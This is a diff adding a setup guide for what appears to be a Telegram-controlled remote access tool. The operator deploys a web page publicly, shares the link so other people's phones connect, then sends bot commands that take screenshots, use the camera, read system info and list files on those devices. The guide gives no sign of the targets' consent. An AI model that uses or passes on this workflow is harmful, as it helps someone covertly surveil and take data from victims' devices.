@@ -1,0 +1,43 @@
+🎯 PHONE 1 CONTROLS PHONE 2 - SETUP INSTRUCTIONS 🎯
+
+✅ WHAT'S FIXED:
+- Phone 1 (You) now controls Phone 2 through Telegram
+- Phone 2 users access a web interface to connect
+- Commands like /screen, /webcam, /sys will work on Phone 2
+
+🚀 HOW TO SETUP:
+
+STEP 1: Deploy to Public Link
+1. Go to Railway.app or Netlify.com
+2. Connect to your GitHub repo: arunaussie7/phone-2
+3. Deploy automatically
+4. Get public URL like: https://your-app.railway.app
+
+STEP 2: Share with Phone 2 Users
+1. Share the public URL with Phone 2 users
+2. They visit the URL and click "Connect Phone 2"
+3. Telegram bot starts on Phone 2
+4. Phone 2 is now ready to be controlled
+
+STEP 3: Control from Phone 1
+1. Open Telegram on Phone 1 (your device)
+2. Find your bot: @Manipalhebbal_Bot
+3. Send commands like:
+   - /screen - Take screenshot of Phone 2
+   - /webcam - Use Phone 2's camera
+   - /sys - Get Phone 2's system info
+   - /ls - List files on Phone 2
+   - And many more!
+
+🎮 RESULT:
+- Phone 1 (You): Controls everything through Telegram
+- Phone 2: Gets controlled and responds to commands
+- Commands work on Phone 2's device, not yours!
+
+📱 TESTING:
+- Local: python start.py (opens http://localhost:5000)
+- Deploy: Upload to Railway/Netlify for public access
+
+---
+
+Now Phone 1 can control Phone 2 through Telegram! 🎉
